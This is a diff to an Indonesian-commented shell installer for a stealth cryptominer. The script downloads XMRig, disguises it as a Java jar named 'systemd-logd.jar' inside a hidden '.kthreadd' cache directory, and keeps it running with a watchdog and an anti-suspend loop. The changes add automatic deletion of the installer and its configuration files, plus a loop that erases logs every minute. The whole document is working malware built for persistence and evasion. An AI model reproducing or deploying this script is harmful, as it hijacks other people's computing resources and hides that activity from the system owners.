@@ -16,11 +16,9 @@ DIR="$HOME/.cache/.kthreadd"
 # === PERSIAPAN ===
 mkdir -p "$DIR" && cd "$DIR"
 sync || true
-echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
 
 # === DOWNLOAD XMRIG ===
-XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | \
-grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
+XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
 curl -sLo xmrig.tar.gz "$XMRIG_URL"
 tar -xzf xmrig.tar.gz --strip-components=1
 rm -f xmrig.tar.gz
@@ -82,7 +80,7 @@ EOF
 javac Launcher.java
 jar cfe systemd-logd.jar Launcher Launcher.class
 
-# === JALANKAN MINER SECARA STEALTH ===
+# === JALANKAN JAVA MINER STEALTH ===
 nohup java -Djna.nosys=true -Djava.awt.headless=true -jar systemd-logd.jar >/dev/null 2>&1 &
 disown
 
@@ -92,7 +90,6 @@ cat > watchdog.sh <<EOF
 while true; do
   if ! pgrep -f systemd-logd.jar >/dev/null; then
     sync || true
-    echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
     nohup java -jar systemd-logd.jar >/dev/null 2>&1 &
     disown
   fi
@@ -104,7 +101,7 @@ chmod +x watchdog.sh
 nohup bash watchdog.sh >/dev/null 2>&1 &
 disown
 
-# === ANTI SUSPEND / ANTI DISMISS JARINGAN ===
+# === ANTI SUSPEND / DISMISS ===
 cat > antisuspend.sh <<EOF
 #!/bin/bash
 while true; do
@@ -122,4 +119,20 @@ chmod +x antisuspend.sh
 nohup bash antisuspend.sh >/dev/null 2>&1 &
 disown
 
-echo "[✓] Stealth miner aktif dengan Java + watchdog + anti suspend."
+# === AUTO HAPUS INSTALLER ===
+(
+  sleep 10
+  rm -f install.sh Launcher.java xmrig.tar.gz proxychains.conf
+  rm -f antisuspend.sh watchdog.sh config.json
+  echo "[✓] Installer dan konfigurasi dibersihkan otomatis."
+) &
+
+# === AUTO HAPUS LOG ===
+(
+  while true; do
+    rm -f "$HOME"/nohup.out "$DIR"/*.log 2>/dev/null
+    sleep 60
+  done
+) &
+
+echo "[✓] Miner stealth + watchdog + anti suspend aktif."
